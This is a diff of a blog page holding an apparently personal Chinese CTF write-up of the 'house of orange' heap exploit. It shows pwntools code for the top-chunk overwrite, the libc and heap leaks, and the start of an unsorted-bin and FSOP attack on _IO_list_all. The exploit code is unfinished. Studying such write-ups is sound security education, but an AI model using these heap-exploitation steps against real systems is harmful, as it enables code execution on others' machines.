@@ -235,7 +235,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-sPiIDEWz" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
+    <div id="aplayer-vSPQgWJC" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 
 
 
@@ -243,7 +243,7 @@
 <h1><span id="逆向">逆向</span></h1><p>​        没有free，只有增查改。</p>
 <p>​        这个题程序逻辑比较简单，主要是利用相对比较复杂。</p>
 <h2><span id="add">add</span></h2><p>​        最多申请三个house。并且在申请house开始为每个house创建了0x10 size的结构体，只有两个字段，size和content ptr。在输入name的阶段会把name读入content ptr指向的地址。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line"> read_str((<span class="keyword">void</span> *)chunk_struct_ptr[<span class="number">1</span>], size);</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">read_str((<span class="keyword">void</span> *)chunk_struct_ptr[<span class="number">1</span>], size);</span><br></pre></td></tr></table></figure>
 
 <p>​        接着输入每个橘子的价钱和颜色。颜色不能自己指定，程序提供了一个抽象的菜单以供选择。我们看一下这个菜单。</p>
 <p>​        难绷。</p>
@@ -271,14 +271,38 @@
 <p>我这里的堆地址比较畸形，就是都是7f开头的，不过目前不影响，之前的top chunk size为0x20f91，地址是070，加起来正好是0x1000，所以我们只需要覆盖为f91就能实现页对齐。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
 
-<h2><span id="获得unsorted-binleak-libc">获得unsorted bin，leak libc</span></h2><p>​        然后直接申请一个0x1011大小的chunk，就获得了0x1011-0xf91 = 0x80大小的unsorted bin。</p>
+<h2><span id="获得unsorted-binleak-libc">获得unsorted bin，leak libc</span></h2><p>​        然后直接申请一个0x1000大小的chunk，让堆以brk的形式拓展，就获得了0xf91大小的unsorted bin。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%8810.02.34.png" alt="截屏2022-04-10 下午10.02.34"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(malloc_hook)))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>
+<p>​        接着我们还需要leak libc和heap，这里我们可以直接申请一个比较大的范围为large chunk的name，使其能够同时leak libc地址和heap基址。能够同时leak当然是因为large chunk的<code>fd_nextsize</code>与<code>bk_nextsize</code>字段。</p>
+<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%883.07.41.png" alt="截屏2022-04-11 下午3.07.41"></p>
+<p>​        当然如果只是申请small chunk大小的话就只能leak libc，heap需要另外leak。不过接收的话还是要分别来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(malloc_hook)))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x400</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0xd0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_addr)))</span><br></pre></td></tr></table></figure>
 
 <p>​        </p>
 <p>​        接下来就是io_file的利用了。</p>
 <h2><span id="fsop">FSOP</span></h2><p>​        由于之前从来咩有做过io_file，所以为了好归纳我就还是再开一篇笔记来专门做io_file的学习笔记吧。等把fsop看完了再来把这个当做例题看。</p>
 <p>​        看完了fsop，回来做题了。</p>
+<p>​        有一个比较奇怪的点，就是这道题我没有猜错的话最早的libc版本应该是libc-2.23.so，但是攻防世界提供的版本是2.19，虽然从io_file利用的角度来看两者其实区别挺大的吗，但是由于这个题目本身的限制非常之多，以至于两个版本实则没有什么大致的区别，并且因为攻防世界的libc没有调试符号，所以我索性就用2.23来做了。</p>
+<p>​        在之前的步骤里我们获得了一个unsortedbin，这也是为什么说这道题的限制非常多，因为我们可以利用的也就只有这一个bin了，所以一般的堆利用方法几乎都失效了。</p>
+<p>​        但是好巧不巧，我们就是能通过这一个bin来实现对于<code>io_list_all</code>的劫持。</p>
+<h3><span id="劫持io_list_all">劫持io_list_all</span></h3><p>​        首先我们需要劫持<code>io_list_all</code>，使它指向我们可以控制的内存区域。</p>
+<p>​        这里会用到<code>unsorted bin attack</code>。将unsorted bin chunk的bk指向<code>_IO_list_all - 0x10</code>，那么就能通过 <code>bck-&gt;fd = unsorted_chunks (av);</code>使<code>io_list_all</code>指向<code>&amp;main_arena+88</code>        。<code>_IO_list_all</code>是位于libc中的全局变量，所以它的地址可以直接通过leak得到。</p>
+<p>​        然后需要伪造结构体，这里面的逻辑比较抽象，大部分原因是我对于这种large bin或者smallbin以及一些结构，还有堆上chunk分配流程的不熟悉，但是我也只能象征性地去理解了。</p>
+<p>​        首先一个比较关键的前置条件是，我们将使<code>io_list_all</code>指向了<code>&amp;main_arena+88</code>。然后非常灵性地，在<code>&amp;main_arena+88</code>指向的<code>_IO_FILE_plus </code>结构体偏移0x68的地方，正好是一个smallchunk的地址。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.20.44.png" alt="截屏2022-04-11 下午4.20.44"></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.21.27.png" alt="截屏2022-04-11 下午4.21.27">        </p>
+<p>​        具体的原理这里暂时不分析。</p>
+<p>​        总结以上条件，就可以试图伪造一个<code>_IO_FILE_plus </code>结构体了。</p>
+<p>​        最后看一眼伪造前的heap</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.31.34.png" alt="截屏2022-04-11 下午4.31.34"></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.33.06.png" alt="截屏2022-04-11 下午4.33.06">        </p>
+<p>​        先用垃圾数据把原本的chunk填充。然后为了伪造fake chunk，首先要把上一个chunk的price结构体还原。    </p>
+<p>​        然后溢出unsortedbin，这里被溢出的chunk就是之前利用house of orange从top chunk获得的unsortedbin chunk。将chunk的size改为0x61.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x1f00000000</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​            对于unsorted bin的bk指针，我们直接覆盖为<code>_IO_list_all_addr - 0x10</code></p>
 <p>​</p>
 
             <div class="clearfix"></div>
